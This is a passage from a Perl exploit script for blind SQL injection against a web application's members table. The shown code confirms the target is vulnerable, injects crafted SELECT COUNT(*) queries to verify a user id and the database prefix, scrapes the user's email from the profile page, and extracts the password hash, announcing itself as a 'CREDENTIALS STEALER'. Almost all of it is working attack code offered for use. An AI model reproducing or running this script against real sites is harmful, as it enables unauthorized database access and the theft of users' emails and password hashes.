 vulnerable!\n";
print "\tTested Blind SQL Injection.\n";
print "\tChecking id user and DB_PREFIX null...\n";
print "\t-----------------------------------------------------------------\n";
}else{
print "\t-----------------------------------------------------------------\n";
print "\tThis Web is not vulnerable (Maybe patched)!\n";
print "\tEXPLOIT FAILED!\n";
print "\t-----------------------------------------------------------------\n";
exit(1);
}
#Test if user exists and DB_PREFIX
my $finalrequest=$finalhost."'+AND+(SELECT+COUNT(*)+from+".$db_prefix."members+WHERE+id=".$idhack.")+/*";
$output=&request($uid,$code,$finalrequest);
if ( $output =~ (/<title>/.$custompage))
{
    print "\t-----------------------------------------------------------------\n";
    print "\tOK...The user exists and DB_PREFIX is '".$db_prefix."'!\n";
    print "\tStarting exploit...\n";
    print "\t-----------------------------------------------------------------\n";
    print "\tWait several minutes...\n";
    print "\t-----------------------------------------------------------------\n";
}else{
    print "\t-----------------------------------------------------------------\n";
    print "\tUser doesn't exists or DB_PREFIX not '".$db_prefix."'\n";
    print "\tEXPLOIT FAILED!\n";
    print "\t-----------------------------------------------------------------\n";
    exit(1); }
#OK, now we get the mail user from web
#i got it from blind sql but this method is faster and reduce time of injection
#First email...
my $hostmail="http://".$host."/".$path."/index.php?module=profiles&action=view&id=".$idhack;
$mail=&mail($uid,$code,$hostmail);
$passhash=&password($db_prefix,$idhack,$uid,$code,$finalhost);
print "\n\t\t*************************************************\n";
print "\t\t****  EXPLOIT EXECUTED (CREDENTIALS STEALER) ****\n";
print "\t\t*************************************************\n\n";
print "\t\tUser-id:".$idhack."\n";
print "\t\tUser-email:".$mail."\n";
print "\t\tUser-password(hash):".$passhash."\n\n";
print "\n\t\t----------------------FINISH!--------------------\n\n";
print "\t\t---------------Thanks to: y3hn4ck3r--------------\n\n";
print "\t\t------------------------EOF----------------------\n\n";
exit(1);
#Ok...all job done
